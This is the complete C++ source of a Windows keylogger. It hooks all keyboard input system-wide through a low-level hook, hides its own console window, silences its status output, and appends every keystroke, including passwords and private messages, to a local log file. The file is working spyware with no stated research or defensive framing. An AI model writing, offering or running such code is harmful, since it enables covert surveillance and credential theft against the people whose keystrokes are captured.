#include <iostream>
#include <fstream>
#include <windows.h>

// File to store the logged keystrokes
std::ofstream logFile;

void logKeystroke(int key) {
    switch (key) {
        case VK_SPACE:
            logFile << " ";
            break;
        case VK_RETURN:
            logFile << "\n";  // Enter key
            break;
        case VK_SHIFT:
            logFile << "[SHIFT]";
            break;
        case VK_BACK:
            logFile << "[BACKSPACE]";
            break;
        case VK_TAB:
            logFile << "[TAB]";
            break;
        case VK_CONTROL:
            logFile << "[CTRL]";
            break;
        case VK_MENU:
            logFile << "[ALT]";
            break;
        case VK_CAPITAL:
            logFile << "[CAPS LOCK]";
            break;
        case VK_ESCAPE:
            logFile << "[ESC]";
            break;
        case VK_LEFT:
            logFile << "[LEFT ARROW]";
            break;
        case VK_RIGHT:
            logFile << "[RIGHT ARROW]";
            break;
        case VK_UP:
            logFile << "[UP ARROW]";
            break;
        case VK_DOWN:
            logFile << "[DOWN ARROW]";
            break;
        case VK_DELETE:
            logFile << "[DEL]";
            break;
        case VK_HOME:
            logFile << "[HOME]";
            break;
        case VK_END:
            logFile << "[END]";
            break;
        case VK_INSERT:
            logFile << "[INS]";
            break;
        case VK_PRIOR:
            logFile << "[PAGE UP]";
            break;
        case VK_NEXT:
            logFile << "[PAGE DOWN]";
            break;
        case VK_F1:
            logFile << "[F1]";
            break;
        case VK_F2:
            logFile << "[F2]";
            break;
        case VK_F3:
            logFile << "[F3]";
            break;
        case VK_F4:
            logFile << "[F4]";
            break;
        case VK_F5:
            logFile << "[F5]";
            break;
        case VK_F6:
            logFile << "[F6]";
            break;
        case VK_F7:
            logFile << "[F7]";
            break;
        case VK_F8:
            logFile << "[F8]";
            break;
        case VK_F9:
            logFile << "[F9]";
            break;
        case VK_F10:
            logFile << "[F10]";
            break;
        case VK_F11:
            logFile << "[F11]";
            break;
        case VK_F12:
            logFile << "[F12]";
            break;
        case VK_LWIN:
        case VK_RWIN:
            logFile << "[WIN]";
            break;
        case VK_OEM_1:
            logFile << "[;:]";
            break;
        case VK_OEM_2:
            logFile << "[/?]";
            break;
        case VK_OEM_3:
            logFile << "[`~]";
            break;
        case VK_OEM_4:
            logFile << "[[{]";
            break;
        case VK_OEM_5:
            logFile << "[\\|]";
            break;
        case VK_OEM_6:
            logFile << "[]}]";
            break;
        case VK_OEM_7:
            logFile << "['\"]";
            break;
        default:
            if ((key >= 0x30) && (key <= 0x39)) {
                logFile << char(key);  // Numbers 0-9
            } else if ((key >= 0x41) && (key <= 0x5A)) {
                logFile << char(key);  // A-Z
            } else {
                logFile << "[UNKNOWN KEY]";
            }
            break;
    }
    logFile.flush();
}

LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
        KBDLLHOOKSTRUCT *kbdStruct = (KBDLLHOOKSTRUCT *)lParam;
        int key = kbdStruct->vkCode;
        logKeystroke(key);
    }
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

void SetHook() {
    // Get the current module handle (needed for older systems like Windows XP)
    HMODULE hModule = GetModuleHandle(NULL);

    // Set the hook using WH_KEYBOARD_LL to intercept low-level keyboard events
    HHOOK hook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, hModule, 0);

    // If hook fails, display the specific error code
    if (hook == NULL) {
        DWORD errorMessageID = GetLastError();
        //std::cerr << "Failed to install hook! Error: " << errorMessageID << std::endl;

        LPVOID lpMsgBuf;
        FormatMessage(
            FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
            NULL,
            errorMessageID,
            MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
            (LPTSTR)&lpMsgBuf,
            0, NULL );

        //std::cerr << "Error message: " << (char*)lpMsgBuf << std::endl;
        LocalFree(lpMsgBuf);
    } else {
        //std::cout << "Hook successfully installed." << std::endl;
    }

    // Message loop to keep the hook alive
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    // Unhook the hook before exiting
    UnhookWindowsHookEx(hook);
}

int main() {

    HWND hwnd = GetConsoleWindow();
    ShowWindow(hwnd, SW_HIDE);
    // Open the log file where keystrokes will be saved
    logFile.open("keylog.txt", std::ios::app);
    if (!logFile) {
        //std::cerr << "Failed to open log file!" << std::endl;
        return 1;
    }

    //std::cout << "Keylogger started. Press Ctrl+C to stop." << std::endl;

    // Set the hook to start logging keystrokes
    SetHook();

    logFile.close();
    return 0;
}
